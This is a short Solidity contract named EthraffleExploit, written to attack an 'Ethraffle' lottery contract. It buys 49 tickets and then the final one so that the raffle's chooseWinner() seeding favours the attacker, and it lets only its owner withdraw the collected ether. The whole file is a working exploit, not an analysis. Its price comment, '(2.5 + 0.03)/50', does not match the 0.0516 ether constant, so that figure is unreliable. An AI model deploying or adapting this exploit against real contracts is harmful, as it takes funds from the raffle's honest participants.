pragma solidity ^0.4.16;

interface IEthraffle {
    function buyTickets() external payable;
}

contract EthraffleExploit {
    IEthraffle public target;
    uint public constant ticketPrice = 0.0516 ether; // (2.5 + 0.03)/50

    address owner;

    constructor(address _target) public {
        target = IEthraffle(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner);

        // Step 1: Buy 49 tickets to fill the contract
        for (uint i = 0; i < 49; i++) {
            target.buyTickets.value(ticketPrice)();
        }

        // Step 2: Final ticket - this triggers winner selection
        // Exploit by being seed2 in chooseWinner()
        target.buyTickets.value(ticketPrice)();
    }

    // Allow contract to receive ETH
    function() external payable {}

    function withdraw() external {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}

